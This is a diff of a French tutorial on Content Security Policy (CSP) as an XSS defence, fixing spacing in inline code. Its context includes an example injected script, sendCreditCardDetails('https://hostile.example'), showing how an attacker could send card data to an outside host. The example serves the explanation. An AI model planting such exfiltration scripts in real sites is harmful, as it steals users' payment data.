@@ -4,7 +4,7 @@
 
 ## Qu'est-ce que le CSP et en quoi est-ce utile ?
 
-Fondamentalement, CSP atténue les attaques XSS (Cross-Site Scripting) en obligeant les développeurs à ajouter aux listes blanches les sources de leurs ressources. Cette liste est renvoyée en tant qu'en-tête du serveur. Par exemple, disons que vous avez un site hébergé à ` https://example.com ` l'en-tête CSP ` default-src: 'self'; ` autorisera toutes les requêtes à destination de ` https://example.com/* ` et refusera tous les autres. Si une section de votre site Web est vulnérable au XSS dans laquelle une entrée d'utilisateur non échappée est affichée, un attaquant pourrait saisir quelque chose du genre :
+Fondamentalement, CSP atténue les attaques XSS (Cross-Site Scripting) en obligeant les développeurs à ajouter aux listes blanches les sources de leurs ressources. Cette liste est renvoyée en tant qu'en-tête du serveur. Par exemple, disons que vous avez un site hébergé à `https://example.com` l'en-tête CSP `default-src: 'self';` autorisera toutes les requêtes à destination de `https://example.com/*` et refusera tous les autres. Si une section de votre site Web est vulnérable au XSS dans laquelle une entrée d'utilisateur non échappée est affichée, un attaquant pourrait saisir quelque chose du genre :
 
     <script>
       sendCreditCardDetails('https://hostile.example');
